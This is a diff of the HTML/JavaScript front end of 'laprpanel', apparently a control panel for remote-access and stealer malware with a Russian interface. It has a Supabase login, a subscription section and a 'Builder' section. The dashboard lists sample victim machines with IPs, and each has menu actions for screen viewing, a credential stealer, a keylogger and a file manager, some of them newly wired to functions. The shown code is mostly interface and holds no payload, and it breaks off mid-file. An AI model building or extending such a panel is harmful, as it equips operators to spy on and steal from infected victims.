@@ -5,383 +5,162 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>laprpanel</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            height: 100vh;
-            background: #07070c;
-            color: #e0e0e0;
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
-            overflow: hidden;
-            letter-spacing: 0.2px;
+            height:100vh; background:#07070c; color:#e0e0e0;
+            font-family:'Inter','Segoe UI',system-ui,sans-serif; overflow:hidden; letter-spacing:0.2px;
         }
-
         /* АВТОРИЗАЦИЯ */
         .login {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100%;
-            width: 100%;
+            display:flex; align-items:center; justify-content:center; height:100%; width:100%;
             background: radial-gradient(ellipse at 30% 30%, #14142a 0%, #07070c 70%);
         }
-
         .card {
-            background: rgba(12, 12, 18, 0.8);
-            backdrop-filter: blur(20px);
-            padding: 50px 44px;
-            border-radius: 28px;
-            width: 460px;
-            max-width: 90vw;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 157, 0.15);
+            background: rgba(12,12,18,0.8); backdrop-filter:blur(20px); padding:50px 44px;
+            border-radius:28px; width:460px; max-width:90vw; text-align:center;
+            border:1px solid rgba(255,255,255,0.06); box-shadow:0 30px 50px rgba(0,0,0,0.7), 0 0 0 1px rgba(0,255,157,0.15);
         }
-
         .card h1 {
-            font-weight: 600;
-            letter-spacing: 1.8px;
-            font-size: 28px;
-            margin-bottom: 32px;
+            font-weight:600; letter-spacing:1.8px; font-size:28px; margin-bottom:32px;
             background: linear-gradient(135deg, #00ff9d, #00d4ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
         }
-
-        .input-group {
-            position: relative;
-            margin: 18px 0;
-        }
-
-        .input-group i {
-            position: absolute;
-            left: 18px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #5a5a6e;
-            font-size: 15px;
-            transition: 0.3s;
-        }
-
+        .input-group { position:relative; margin:18px 0; }
+        .input-group i { position:absolute; left:18px; top:50%; transform:translateY(-50%); color:#5a5a6e; font-size:15px; transition:0.3s; }
         .input-group input {
-            width: 100%;
-            padding: 15px 18px 15px 48px;
-            background: rgba(20, 20, 30, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.25s;
+            width:100%; padding:15px 18px 15px 48px; background:rgba(20,20,30,0.7);
+            border:1px solid rgba(255,255,255,0.08); border-radius:14px; color:#fff; font-size:15px; outline:none; transition:0.25s;
         }
-
-        .input-group input:focus {
-            border-color: #00ff9d;
-            box-shadow: 0 0 18px rgba(0, 255, 157, 0.2);
-        }
-        .input-group input:focus+i { color: #00ff9d; }
-
+        .input-group input:focus { border-color:#00ff9d; box-shadow:0 0 18px rgba(0,255,157,0.2); }
+        .input-group input:focus+i { color:#00ff9d; }
         button {
-            width: 100%;
-            padding: 15px;
-            margin: 12px 0;
-            border: none;
-            border-radius: 14px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            letter-spacing: 0.6px;
-            transition: 0.25s;
+            width:100%; padding:15px; margin:12px 0; border:none; border-radius:14px;
+            font-weight:600; font-size:15px; cursor:pointer; letter-spacing:0.6px; transition:0.25s;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #00ff9d, #00cc7a);
-            color: #0a0a0a;
-            font-weight: 700;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 28px rgba(0, 255, 157, 0.35);
-        }
-        .btn-outline {
-            background: transparent;
-            color: #b0b0c0;
-            border: 1px solid #2a2a3a;
-        }
-        .btn-outline:hover {
-            border-color: #00ff9d;
-            color: #00ff9d;
-            background: rgba(0, 255, 157, 0.04);
-        }
-
-        .status-message {
-            margin-top: 20px;
-            font-size: 14px;
-            min-height: 20px;
-            font-weight: 500;
-            border-radius: 8px;
-            padding: 8px 12px;
-        }
-        .status-message.error { color: #ff5e7a; background: rgba(255, 50, 70, 0.08); }
-        .status-message.success { color: #00ff9d; background: rgba(0, 255, 157, 0.08); }
-        .status-message.info { color: #ffb74d; background: rgba(255, 183, 77, 0.08); }
+        .btn-primary { background:linear-gradient(135deg, #00ff9d, #00cc7a); color:#0a0a0a; font-weight:700; }
+        .btn-primary:hover { transform:translateY(-2px); box-shadow:0 12px 28px rgba(0,255,157,0.35); }
+        .btn-outline { background:transparent; color:#b0b0c0; border:1px solid #2a2a3a; }
+        .btn-outline:hover { border-color:#00ff9d; color:#00ff9d; background:rgba(0,255,157,0.04); }
+        .status-message { margin-top:20px; font-size:14px; min-height:20px; font-weight:500; border-radius:8px; padding:8px 12px; }
+        .status-message.error { color:#ff5e7a; background:rgba(255,50,70,0.08); }
+        .status-message.success { color:#00ff9d; background:rgba(0,255,157,0.08); }
+        .status-message.info { color:#ffb74d; background:rgba(255,183,77,0.08); }
 
         /* ДЭШБОРД */
-        .dashboard {
-            display: flex;
-            height: 100vh;
-            width: 100%;
-            background: #07070c;
-        }
-
+        .dashboard { display:flex; height:100vh; width:100%; background:#07070c; }
         .sidebar {
-            width: 270px;
-            background: rgba(10, 10, 16, 0.9);
-            backdrop-filter: blur(16px);
-            border-right: 1px solid rgba(255, 255, 255, 0.05);
-            padding: 32px 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            box-shadow: 4px 0 25px rgba(0, 0, 0, 0.6);
+            width:270px; background:rgba(10,10,16,0.9); backdrop-filter:blur(16px);
+            border-right:1px solid rgba(255,255,255,0.05); padding:32px 20px;
+            display:flex; flex-direction:column; gap:6px; box-shadow:4px 0 25px rgba(0,0,0,0.6);
         }
         .sidebar h2 {
-            font-weight: 600;
-            letter-spacing: 1.5px;
-            font-size: 21px;
-            margin-bottom: 28px;
-            padding-left: 14px;
-            background: linear-gradient(135deg, #00ff9d, #00d4ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-weight:600; letter-spacing:1.5px; font-size:21px; margin-bottom:28px; padding-left:14px;
+            background:linear-gradient(135deg, #00ff9d, #00d4ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent;
         }
-
         .nav-item {
-            padding: 13px 16px;
-            cursor: pointer;
-            border-radius: 12px;
-            transition: 0.25s;
-            font-weight: 500;
-            font-size: 15px;
-            color: #9a9aae;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border: 1px solid transparent;
+            padding:13px 16px; cursor:pointer; border-radius:12px; transition:0.25s;
+            font-weight:500; font-size:15px; color:#9a9aae; display:flex; align-items:center; gap:12px; border:1px solid transparent;
         }
-        .nav-item i {
-            width: 20px;
-            text-align: center;
-            font-size: 16px;
-            color: #6a6a7e;
-            transition: 0.25s;
-        }
-        .nav-item:hover {
-            background: rgba(255, 255, 255, 0.04);
-            color: #ddd;
-            border-color: rgba(255, 255, 255, 0.06);
-        }
-        .nav-item:hover i { color: #00ff9d; }
+        .nav-item i { width:20px; text-align:center; font-size:16px; color:#6a6a7e; transition:0.25s; }
+        .nav-item:hover { background:rgba(255,255,255,0.04); color:#ddd; border-color:rgba(255,255,255,0.06); }
+        .nav-item:hover i { color:#00ff9d; }
         .nav-item.active {
-            background: rgba(0, 255, 157, 0.08);
-            color: #00ff9d;
-            border-color: rgba(0, 255, 157, 0.25);
-            box-shadow: 0 0 18px rgba(0, 255, 157, 0.1);
+            background:rgba(0,255,157,0.08); color:#00ff9d; border-color:rgba(0,255,157,0.25); box-shadow:0 0 18px rgba(0,255,157,0.1);
         }
-        .nav-item.active i { color: #00ff9d; }
-
-        .spacer { flex: 1; }
-
+        .nav-item.active i { color:#00ff9d; }
+        .spacer { flex:1; }
         .logout-btn {
-            padding: 13px 16px;
-            cursor: pointer;
-            border-radius: 12px;
-            transition: 0.25s;
-            font-weight: 500;
-            font-size: 15px;
-            color: #f47282;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            padding:13px 16px; cursor:pointer; border-radius:12px; transition:0.25s;
+            font-weight:500; font-size:15px; color:#f47282; display:flex; align-items:center; gap:12px;
         }
-        .logout-btn:hover {
-            background: rgba(244, 114, 130, 0.1);
-            border: 1px solid rgba(244, 114, 130, 0.2);
-        }
-
-        .main {
-            flex: 1;
-            padding: 45px 55px;
-            overflow-y: auto;
-            background: #0b0b12;
-        }
-        .main h1 {
-            font-size: 30px;
-            font-weight: 600;
-            margin-bottom: 14px;
-            color: #f0f0f5;
-            letter-spacing: -0.3px;
-        }
-        .main p { color: #9090a0; line-height: 1.7; }
-
+        .logout-btn:hover { background:rgba(244,114,130,0.1); border:1px solid rgba(244,114,130,0.2); }
+        .main { flex:1; padding:45px 55px; overflow-y:auto; background:#0b0b12; }
+        .main h1 { font-size:30px; font-weight:600; margin-bottom:14px; color:#f0f0f5; letter-spacing:-0.3px; }
+        .main p { color:#9090a0; line-height:1.7; }
         .card-content {
-            background: rgba(18, 18, 26, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 22px;
-            padding: 32px;
-            margin-top: 22px;
-            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5);
+            background:rgba(18,18,26,0.7); backdrop-filter:blur(12px); border:1px solid rgba(255,255,255,0.05);
+            border-radius:22px; padding:32px; margin-top:22px; box-shadow:0 20px 35px rgba(0,0,0,0.5);
         }
-
         .tag {
-            display: inline-block;
-            background: rgba(0, 255, 157, 0.1);
-            color: #00ff9d;
-            padding: 5px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            border: 1px solid rgba(0, 255, 157, 0.25);
+            display:inline-block; background:rgba(0,255,157,0.1); color:#00ff9d;
+            padding:5px 14px; border-radius:20px; font-size:13px; font-weight:600; border:1px solid rgba(0,255,157,0.25);
         }
-
         .creator-badge {
-            background: linear-gradient(135deg, #ffb347, #ff6b6b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 700;
-            margin-left: 8px;
-            font-size: 14px;
+            background:linear-gradient(135deg, #ffb347, #ff6b6b); -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent; font-weight:700; margin-left:8px; font-size:14px;
         }
-
-        button:disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
-
+        button:disabled { opacity:0.5; cursor:not-allowed; pointer-events:none; }
         .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid transparent;
-            border-top-color: #0a0a0a;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            display:inline-block; width:16px; height:16px; border:2px solid transparent;
+            border-top-color:#0a0a0a; border-radius:50%; animation:spin 0.7s linear infinite; margin-right:8px; vertical-align:middle;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin { to { transform:rotate(360deg); } }
 
-        .build-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 20px;
+        .build-form { display:flex; flex-direction:column; gap:15px; margin-top:20px; }
+        .build-form label { font-weight:500; color:#ccc; display:flex; align-items:center; gap:10px; }
+        .build-form input[type="text"], .build-form input[type="password"] {
+            width:100%; padding:12px; background:#12121f; border:1px solid #2a2a3a; border-radius:10px; color:#fff; outline:none;
         }
-        .build-form label {
-            font-weight: 500;
-            color: #ccc;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .build-form input[type="text"],
-        .build-form input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            background: #12121f;
-            border: 1px solid #2a2a3a;
-            border-radius: 10px;
-            color: #fff;
-            outline: none;
-        }
-        .build-form input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #00ff9d;
-        }
-        .module-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
+        .build-form input[type="checkbox"] { width:18px; height:18px; accent-color:#00ff9d; }
+        .module-group { display:flex; flex-wrap:wrap; gap:15px; }
 
-        /* Таблица устройств */
-        .device-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 10px;
-        }
-        .device-table th {
-            text-align: left;
-            padding: 12px 8px;
-            font-weight: 500;
-            color: #aaa;
-            border-bottom: 1px solid #2a2a3a;
-        }
-        .device-table td {
-            padding: 12px 8px;
-            border-bottom: 1px solid #1f1f2e;
-            font-size: 14px;
-        }
-        .device-table tr:hover td {
-            background: rgba(255,255,255,0.02);
-        }
-        .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-right: 6px;
-        }
-        .status-online { background: #00ff9d; }
-        .status-offline { background: #555; }
-
-        .device-actions {
-            position: relative;
-            cursor: pointer;
-            color: #aaa;
-        }
-        .device-actions:hover {
-            color: #00ff9d;
-        }
-
-        /* Контекстное меню действий */
+        /* Таблица */
+        .device-table { width:100%; border-collapse:collapse; margin-top:10px; }
+        .device-table th { text-align:left; padding:12px 8px; font-weight:500; color:#aaa; border-bottom:1px solid #2a2a3a; }
+        .device-table td { padding:12px 8px; border-bottom:1px solid #1f1f2e; font-size:14px; }
+        .device-table tr:hover td { background:rgba(255,255,255,0.02); }
+        .status-dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
+        .status-online { background:#00ff9d; } .status-offline { background:#555; }
+        .device-actions { position:relative; cursor:pointer; color:#aaa; }
+        .device-actions:hover { color:#00ff9d; }
         .action-menu {
-            position: absolute;
-            right: 0;
-            top: 100%;
-            background: #1a1a2e;
-            border: 1px solid #2a2a3a;
-            border-radius: 10px;
-            padding: 8px 0;
-            z-index: 10;
-            min-width: 160px;
-            display: none;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+            position:absolute; right:0; top:100%; background:#1a1a2e; border:1px solid #2a2a3a;
+            border-radius:10px; padding:8px 0; z-index:10; min-width:160px; display:none; box-shadow:0 8px 20px rgba(0,0,0,0.6);
         }
-        .action-menu.show {
-            display: block;
-        }
+        .action-menu.show { display:block; }
         .action-menu div {
-            padding: 10px 16px;
-            cursor: pointer;
-            font-size: 14px;
-            color: #ccc;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            padding:10px 16px; cursor:pointer; font-size:14px; color:#ccc; display:flex; align-items:center; gap:10px;
         }
-        .action-menu div:hover {
-            background: #00ff9d10;
-            color: #00ff9d;
+        .action-menu div:hover { background:#00ff9d10; color:#00ff9d; }
+
+        /* Уведомления */
+        #notifications-container {
+            position:fixed; top:20px; right:20px; z-index:1100; display:flex; flex-direction:column; gap:10px;
+            pointer-events:none;
+        }
+        .notification-item {
+            background:#1a1a2e; border:1px solid #2a2a3a; border-radius:12px; padding:16px 20px;
+            min-width:280px; box-shadow:0 10px 25px rgba(0,0,0,0.5); pointer-events:auto;
+            display:flex; flex-direction:column; gap:8px;
+        }
+        .notification-item .progress-text { font-size:14px; color:#00ff9d; }
+        .notification-item .download-btn {
+            background:linear-gradient(135deg, #00ff9d, #00cc7a); color:#0a0a0a; border:none;
+            border-radius:8px; padding:8px 16px; font-weight:600; cursor:pointer; display:none;
+        }
+        .notification-item .close-notify { align-self:flex-end; cursor:pointer; color:#888; }
+
+        /* Модальное окно */
+        #modal-overlay {
+            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.75); z-index:2000;
+            align-items:center; justify-content:center;
+        }
+        #modal-overlay.open { display:flex; }
+        #modal-content {
+            background:#1a1a2e; border-radius:16px; padding:20px; min-width:800px; position:relative;
+            border:1px solid #2a2a3a;
         }
     </style>
 </head>
 <body>
 <div id="root"></div>
+<div id="notifications-container"></div>
+<div id="modal-overlay" onclick="closeModal()">
+    <div id="modal-content" onclick="event.stopPropagation()"></div>
+</div>
 
 <script>
     const supabaseClient = supabase.createClient(
@@ -393,281 +172,249 @@
     let activeNav = 'panel';
     let isCreator = false;
 
-    // ========== АВТОРИЗАЦИЯ ==========
     function showAuthForm(view = 'login') {
         currentView = view;
         const isLogin = view === 'login';
         document.getElementById('root').innerHTML = `
-        <div class="login">
-          <div class="card">
-            <h1>LAPRPANEL</h1>
-            <form onsubmit="event.preventDefault(); ${isLogin ? 'handleLogin()' : 'handleRegister()'}">
-              <div class="input-group">
-                <input type="email" id="email" placeholder="Email" required>
-                <i class="fas fa-envelope"></i>
-              </div>
-              <div class="input-group">
-                <input type="password" id="password" placeholder="Пароль (мин. 6 символов)" required minlength="6">
-                <i class="fas fa-lock"></i>
-              </div>
-              ${!isLogin ? `
-              <div class="input-group">
-                <input type="password" id="passwordConfirm" placeholder="Подтвердите пароль" required minlength="6">
-                <i class="fas fa-check-circle"></i>
-              </div>` : ''}
-              <button type="submit" class="btn-primary" id="submitBtn">${isLogin ? 'Войти' : 'Зарегистрироваться'}</button>
-            </form>
-            <button class="btn-outline" onclick="showAuthForm('${isLogin ? 'register' : 'login'}')">
-              ${isLogin ? 'Нет аккаунта? Зарегистрироваться' : 'Уже есть аккаунт? Войти'}
-            </button>
-            <div class="status-message" id="status"></div>
-          </div>
-        </div>`;
+        <div class="login"><div class="card">
+          <h1>LAPRPANEL</h1>
+          <form onsubmit="event.preventDefault(); ${isLogin ? 'handleLogin()' : 'handleRegister()'}">
+            <div class="input-group"><input type="email" id="email" placeholder="Email" required><i class="fas fa-envelope"></i></div>
+            <div class="input-group"><input type="password" id="password" placeholder="Пароль (мин. 6 символов)" required minlength="6"><i class="fas fa-lock"></i></div>
+            ${!isLogin ? `<div class="input-group"><input type="password" id="passwordConfirm" placeholder="Подтвердите пароль" required minlength="6"><i class="fas fa-check-circle"></i></div>` : ''}
+            <button type="submit" class="btn-primary" id="submitBtn">${isLogin ? 'Войти' : 'Зарегистрироваться'}</button>
+          </form>
+          <button class="btn-outline" onclick="showAuthForm('${isLogin ? 'register' : 'login'}')">${isLogin ? 'Нет аккаунта?' : 'Уже есть аккаунт?'}</button>
+          <div class="status-message" id="status"></div>
+        </div></div>`;
     }
 
-    function setStatus(msg, type) {
-        const el = document.getElementById('status');
-        if (el) { el.textContent = msg; el.className = 'status-message ' + type; }
-    }
-
-    function setLoading(loading) {
-        const btn = document.getElementById('submitBtn');
-        if (!btn) return;
-        btn.disabled = loading;
-        btn.innerHTML = loading ? '<span class="spinner"></span> Загрузка...' : (currentView === 'login' ? 'Войти' : 'Зарегистрироваться');
-    }
+    function setStatus(msg, type) { const e=document.getElementById('status'); if(e){e.textContent=msg; e.className='status-message '+type;} }
+    function setLoading(l) { const b=document.getElementById('submitBtn'); if(!b)return; b.disabled=l; b.innerHTML=l?'<span class="spinner"></span> Загрузка...':(currentView==='login'?'Войти':'Зарегистрироваться'); }
 
     async function handleRegister() {
-        const email = document.getElementById('email').value.trim();
-        const pass = document.getElementById('password').value;
-        const pass2 = document.getElementById('passwordConfirm')?.value;
-        if (!email || !pass) return setStatus('Заполните все поля', 'error');
-        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return setStatus('Некорректный email', 'error');
-        if (pass.length < 6) return setStatus('Минимум 6 символов', 'error');
-        if (pass2 && pass !== pass2) return setStatus('Пароли не совпадают', 'error');
-
-        setLoading(true);
-        const { data, error } = await supabaseClient.auth.signUp({ email, password: pass });
-        setLoading(false);
-        if (error) return setStatus(error.message.includes('already') ? 'Пользователь уже существует' : error.message, 'error');
-        if (data?.session) { showDashboard(); }
-        else { setStatus('Подтвердите email (проверьте почту)', 'success'); setTimeout(() => showAuthForm('login'), 3000); }
+        const email=document.getElementById('email').value.trim(), pass=document.getElementById('password').value;
+        if(!email||!pass) return setStatus('Заполните все поля','error');
+        if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return setStatus('Некорректный email','error');
+        if(pass.length<6) return setStatus('Минимум 6 символов','error');
+        const pass2=document.getElementById('passwordConfirm')?.value;
+        if(pass2&&pass!==pass2) return setStatus('Пароли не совпадают','error');
+        setLoading(true); const {data,error}=await supabaseClient.auth.signUp({email,password:pass}); setLoading(false);
+        if(error) return setStatus(error.message.includes('already')?'Пользователь уже существует':error.message,'error');
+        if(data?.session){showDashboard();}else{setStatus('Подтвердите email','success');setTimeout(()=>showAuthForm('login'),3000);}
     }
 
     async function handleLogin() {
-        const email = document.getElementById('email').value.trim();
-        const pass = document.getElementById('password').value;
-        if (!email || !pass) return setStatus('Заполните все поля', 'error');
-        setLoading(true);
-        const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password: pass });
-        setLoading(false);
-        if (error) return setStatus('Неверный email или пароль', 'error');
-        if (data?.session) showDashboard();
+        const email=document.getElementById('email').value.trim(), pass=document.getElementById('password').value;
+        if(!email||!pass) return setStatus('Заполните все поля','error');
+        setLoading(true); const {data,error}=await supabaseClient.auth.signInWithPassword({email,password:pass}); setLoading(false);
+        if(error) return setStatus('Неверный email или пароль','error');
+        if(data?.session) showDashboard();
     }
 
-    // ========== ДЭШБОРД ==========
     async function showDashboard() {
-        currentView = 'dashboard';
-        const { data: { user } } = await supabaseClient.auth.getUser();
-        // Список создателей
-        const creatorEmails = ['kilersosiska130@gmail.com', 'mamkoebar@gmail.com'];
-        isCreator = creatorEmails.includes(user?.email);
-
-        document.getElementById('root').innerHTML = `
+        currentView='dashboard';
+        const {data:{user}}=await supabaseClient.auth.getUser();
+        const creators=['kilersosiska130@gmail.com','mamkoebar@gmail.com'];
+        isCreator=creators.includes(user?.email);
+        document.getElementById('root').innerHTML=`
         <div class="dashboard">
           <div class="sidebar">
-            <h2>LAPRPANEL<span class="creator-badge">${isCreator ? 'CREATOR' : ''}</span></h2>
-            <div class="nav-item ${activeNav==='panel'?'active':''}" onclick="showPanel()">
-              <i class="fas fa-users"></i> Панель
-            </div>
-            <div class="nav-item ${activeNav==='builder'?'active':''}" onclick="showBuilder()">
-              <i class="fas fa-cubes"></i> Builder
-            </div>
-            <div class="nav-item ${activeNav==='notify'?'active':''}" onclick="showNotify()">
-              <i class="fas fa-bell"></i> Уведомления
-            </div>
-            <div class="nav-item ${activeNav==='community'?'active':''}" onclick="showCommunity()">
-              <i class="fas fa-comments"></i> Форум
-            </div>
-            <div class="nav-item ${activeNav==='subs'?'active':''}" onclick="showSubs()">
-              <i class="fas fa-crown"></i> Подписки
-            </div>
-            <div class="nav-item ${activeNav==='settings'?'active':''}" onclick="showSettings()">
-              <i class="fas fa-gear"></i> Настройки
-            </div>
+            <h2>LAPRPANEL<span class="creator-badge">${isCreator?'CREATOR':''}</span></h2>
+            <div class="nav-item ${activeNav==='panel'?'active':''}" onclick="showPanel()"><i class="fas fa-users"></i> Панель</div>
+            <div class="nav-item ${activeNav==='builder'?'active':''}" onclick="showBuilder()"><i class="fas fa-cubes"></i> Builder</div>
+            <div class="nav-item ${activeNav==='notify'?'active':''}" onclick="showNotify()"><i class="fas fa-bell"></i> Уведомления</div>
+            <div class="nav-item ${activeNav==='community'?'active':''}" onclick="showCommunity()"><i class="fas fa-comments"></i> Форум</div>
+            <div class="nav-item ${activeNav==='subs'?'active':''}" onclick="showSubs()"><i class="fas fa-crown"></i> Подписки</div>
+            <div class="nav-item ${activeNav==='settings'?'active':''}" onclick="showSettings()"><i class="fas fa-gear"></i> Настройки</div>
             <div class="spacer"></div>
-            <div class="logout-btn" onclick="handleLogout()">
-              <i class="fas fa-right-from-bracket"></i> Выйти
-            </div>
+            <div class="logout-btn" onclick="handleLogout()"><i class="fas fa-right-from-bracket"></i> Выйти</div>
           </div>
           <div class="main" id="content">${getPanelContent()}</div>
         </div>`;
     }
 
-    function updateActiveNav(nav) {
-        activeNav = nav;
-        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-        const items = document.querySelectorAll('.nav-item');
-        const map = { panel: 0, builder: 1, notify: 2, community: 3, subs: 4, settings: 5 };
-        if (items[map[nav]]) items[map[nav]].classList.add('active');
-    }
+    function updateActiveNav(nav){ activeNav=nav; document.querySelectorAll('.nav-item').forEach(e=>e.classList.remove('active')); const m={panel:0,builder:1,notify:2,community:3,subs:4,settings:5}; const items=document.querySelectorAll('.nav-item'); if(items[m[nav]]) items[m[nav]].classList.add('active'); }
 
-    function getPanelContent() {
-        const devices = [
-            { id: 'A7F3C2', name: 'DESKTOP-A1B2C3', os: 'Windows 10 Pro', ip: '45.132.18.77', country: 'Russia', status: 'online' },
-            { id: 'D4E1B9', name: 'LAPTOP-X7Y8Z9', os: 'Windows 11', ip: '91.200.12.44', country: 'Kazakhstan', status: 'offline' },
-            { id: 'F0C8A2', name: 'SERVER-DB01', os: 'Ubuntu 22.04', ip: '185.45.67.11', country: 'Netherlands', status: 'online' },
-            { id: '1B5E7D', name: 'OFFICE-PC', os: 'Windows 10 LTSC', ip: '78.56.130.90', country: 'Germany', status: 'online' },
-            { id: '3A9F6C', name: 'HOME-PC', os: 'macOS Monterey', ip: '123.45.67.89', country: 'USA', status: 'offline' }
+    function getPanelContent(){
+        const devices=[ 
+            {id:'A7F3C2',name:'DESKTOP-A1B2C3',os:'Windows 10 Pro',ip:'45.132.18.77',country:'Russia',status:'online'},
+            {id:'D4E1B9',name:'LAPTOP-X7Y8Z9',os:'Windows 11',ip:'91.200.12.44',country:'Kazakhstan',status:'offline'},
+            {id:'F0C8A2',name:'SERVER-DB01',os:'Ubuntu 22.04',ip:'185.45.67.11',country:'Netherlands',status:'online'},
+            {id:'1B5E7D',name:'OFFICE-PC',os:'Windows 10 LTSC',ip:'78.56.130.90',country:'Germany',status:'online'},
+            {id:'3A9F6C',name:'HOME-PC',os:'macOS Monterey',ip:'123.45.67.89',country:'USA',status:'offline'}
         ];
-
-        let rows = devices.map(d => `
-            <tr>
-                <td>${d.id}</td>
-                <td>${d.name}</td>
-                <td>${d.os}</td>
-                <td>${d.ip}</td>
-                <td>${d.country}</td>
-                <td><span class="status-dot ${d.status==='online'?'status-online':'status-offline'}"></span>${d.status==='online'?'Online':'Offline'}</td>
-                <td class="device-actions" onclick="toggleActionMenu(event, '${d.id}')">
-                    <i class="fas fa-ellipsis-v"></i>
-                    <div id="menu-${d.id}" class="action-menu">
-                        <div onclick="alert('Просмотр экрана для ${d.name}')"><i class="fas fa-desktop"></i> Экран</div>
-                        <div onclick="alert('Стилер для ${d.name}')"><i class="fas fa-file-download"></i> Стилер</div>
-                        <div onclick="alert('Звук для ${d.name}')"><i class="fas fa-volume-up"></i> Звук</div>
-                        <div onclick="alert('Кейлоггер для ${d.name}')"><i class="fas fa-keyboard"></i> Кейлоггер</div>
-                        <div onclick="alert('Файловый менеджер ${d.name}')"><i class="fas fa-folder-open"></i> Файлы</div>
-                    </div>
-                </td>
-            </tr>
-        `).join('');
-
-        return `
-        <h1>Панель управления</h1>
-        <p>Подключённые устройства <span class="tag">${devices.length} активных</span></p>
-        <div class="card-content">
-          <table class="device-table">
-            <thead>
-              <tr><th>ID</th><th>Имя</th><th>ОС</th><th>IP</th><th>Страна</th><th>Статус</th><th></th></tr>
-            </thead>
-            <tbody>
-              ${rows}
-            </tbody>
-          </table>
-        </div>`;
+        return `<h1>Панель управления</h1><p>Подключённые устройства <span class="tag">${devices.length} активных</span></p>
+        <div class="card-content"><table class="device-table"><thead><tr><th>ID</th><th>Имя</th><th>ОС</th><th>IP</th><th>Страна</th><th>Статус</th><th></th></tr></thead><tbody>
+        ${devices.map(d=>`<tr>
+            <td>${d.id}</td><td>${d.name}</td><td>${d.os}</td><td>${d.ip}</td><td>${d.country}</td>
+            <td><span class="status-dot ${d.status==='online'?'status-online':'status-offline'}"></span>${d.status==='online'?'Online':'Offline'}</td>
+            <td class="device-actions" onclick="toggleActionMenu(event,'${d.id}')"><i class="fas fa-ellipsis-v"></i>
+                <div id="menu-${d.id}" class="action-menu">
+                    <div onclick="showScreenViewer('${d.name}')"><i class="fas fa-desktop"></i> Экран</div>
+                    <div onclick="startStiller('${d.name}','${d.id}')"><i class="fas fa-file-download"></i> Стилер</div>
+                    <div onclick="alert('Звук для ${d.name}')"><i class="fas fa-volume-up"></i> Звук</div>
+                    <div onclick="alert('Кейлоггер для ${d.name}')"><i class="fas fa-keyboard"></i> Кейлоггер</div>
+                    <div onclick="alert('Файлы ${d.name}')"><i class="fas fa-folder-open"></i> Файлы</div>
+                </div>
+            </td>
+        </tr>`).join('')}</tbody></table></div>`;
     }
 
-    // Функция для переключения меню действий
-    window.toggleActionMenu = function(event, deviceId) {
+    window.toggleActionMenu = function(event, deviceId){
         event.stopPropagation();
         const menu = document.getElementById(`menu-${deviceId}`);
-        if (!menu) return;
-        // Закрыть все другие меню
-        document.querySelectorAll('.action-menu').forEach(m => {
-            if (m !== menu) m.classList.remove('show');
-        });
+        if(!menu) return;
+        document.querySelectorAll('.action-menu').forEach(m=>{ if(m!==menu) m.classList.remove('show'); });
         menu.classList.toggle('show');
     };
+    document.addEventListener('click', function(e){ if(!e.target.closest('.device-actions')) document.querySelectorAll('.action-menu').forEach(m=>m.classList.remove('show')); });
 
-    // Закрытие меню при клике вне
-    document.addEventListener('click', function(event) {
-        if (!event.target.closest('.device-actions')) {
-            document.querySelectorAll('.action-menu').forEach(m => m.classList.remove('show'));
-        }
-    });
+    function showPanel(){ updateActiveNav('panel'); document.getElementById('content').innerHTML = getPanelContent(); }
 
-    function showPanel() { updateActiveNav('panel'); document.getElementById('content').innerHTML = getPanelContent(); }
-
-    function showBuilder() {
